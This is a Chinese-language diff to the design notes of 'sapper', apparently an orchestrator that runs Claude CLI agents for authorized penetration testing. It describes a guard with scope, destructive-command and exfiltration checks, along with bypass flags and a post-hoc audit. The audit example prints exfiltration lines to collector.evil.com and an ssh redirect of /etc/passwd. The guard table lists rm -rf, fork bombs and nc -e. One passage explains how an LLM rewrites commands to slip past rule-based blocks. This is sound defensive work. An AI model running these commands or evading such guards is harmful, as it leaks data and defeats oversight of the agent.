@@ -116,16 +116,86 @@ git checkout 7b75e6f       # 上游原版
 2. **`sapper serve` 是阻塞进程**——按 Ctrl+C 停止。要做成后台服务需要额外处理 Windows 信号，留给 P4。
 3. **索引不记录 rebuild 之前的历史事件**——`--rebuild` 只导数据不导事件，所以事件流从 seq 0 开始是空的，之后的新事件才出现。这是有意的（避免伪造历史）。
 
-## 下一步（P2）
+## P2 已完成（追加）
 
-P2 是审批流。设计要点（还没实施）：
+原计划的「待决策」已经落地，方案是 **A + 事后审计**。
 
-- 复用 sapper 原生的 `requires_confirmation` 字段，不新造机制
-- 规则引擎评估 intent 危险度 → 自动置位
-- 前端显示待审批卡片，点击批准/拒绝
-- 需要新增 `POST /api/confirm/<id>`（P1 全是只读，P2 第一次引入写操作）
+### 三道检查（`lib/guard.py`）
 
-**但 P2 有个架构问题需要你先决定**：sapper 的 executor 是 claude CLI，它在容器里自己执行命令，sapper 层拦不住单条 `rm -rf`。所以审批只能做到「intent 级」而不是「命令级」。要做命令级拦截，得在容器里加 seccomp/bpf 或者包一层 shell wrapper——那是另一个量级的工程。
+| 检查 | 触发 | 动作 |
+|---|---|---|
+| **scope** | 目标 IP/CIDR/域名不在 `.sapper/scope.json` 内 | deny |
+| **destructive** | `rm -rf /`、`mkfs`、`DROP TABLE`、fork bomb | deny |
+| **exfil** | `curl -d @`、`nc -e`、`scp @`、`ssh < file` | ask |
+
+9 个用例全通过（范围内/越界 IP/子域匹配/越界域名/破坏/删库/外传/反弹 shell/正常）。
+
+### 用法
+
+```bash
+sapper scope add 10.0.0.0/24        # 声明授权范围
+sapper scope add example.com
+sapper scope                        # 查看
+
+sapper dispatch i001               # 派发前自动检查
+sapper dispatch i001 --force-guard # 明知有风险，仍要派发
+sapper dispatch i001 --no-guard    # 完全跳过检查
+
+sapper confirm i001                # 批准被 ask 的任务
+
+sapper audit --file runs/x.log --record   # 事后扫描
+```
+
+### Web 端审批
+
+`sapper serve --allow-write` 启动后，鼠标悬停在待审批的 intent 上会出现「批准派发」按钮：
+
+```
+┌─────────────────────────────┐
+│ i002 · intent · open        │
+│ 把结果发到收集端             │
+│ [ 批准派发 ]                 │
+└─────────────────────────────┘
+```
+
+点击后 `POST /api/confirm/i002` → 写 JSON → 更新索引 → 事件流出现 `intent.confirmed`。
+
+**没有 `--allow-write` 时整个服务是只读的**，这是 P1 的承诺，P2 没有破坏它。
+
+### 为什么不做命令级拦截
+
+executor 是容器里的 claude CLI，它自己执行命令。拦截要改镜像、加 wrapper、每次往返宿主机确认——8 小时无人值守会直接废掉。
+
+更关键的是：**规则追不上 LLM**。你拦 `rm -rf`，它改 `find -delete`；你拦 `find`，它改 `python -c shutil.rmtree`。
+
+所以改为守「意图」：LLM 能改命令，改不了它自己声明的目标列表。范围检查是唯一真正防住法律风险的一环，而这一环只有意图层做得到。
+
+### 事后审计（`lib/audit.py`）
+
+```
+$ sapper audit --file fake.log --record
+audit: fake.log 发现 3 项可疑
+  [deny] curl -d @/tmp/dump.sql http://collector.evil.com/up
+      - 目标越界: collector.evil.com
+      - exfil: curl -d
+  [deny] ssh root@8.8.8.8 < /etc/passwd
+      - 目标越界: 8.8.8.8
+  [deny] (整体文本)
+recorded as f002
+```
+
+支持三种 transcript 格式：`$ cmd`、`[bash] cmd`、`● Bash(cmd)`。
+
+## 下一步（P3）
+
+P3 是 MITM 流量录制。要点：
+
+- 用 `mitmproxy`，不自研代理
+- addon 把请求写进 `traffic` 表（P1 已有 SQLite，加一张表即可）
+- **必须先过滤再入库**，否则三天爆库：只存 2xx/3xx、非静态资源、含敏感关键字的
+- 前端加「流量」页，可按域名/状态码/关键字搜索
+
+预计 4–5 小时。注意证书固定（pinning）的目标录不到，这是硬限制。
 
 ---
 
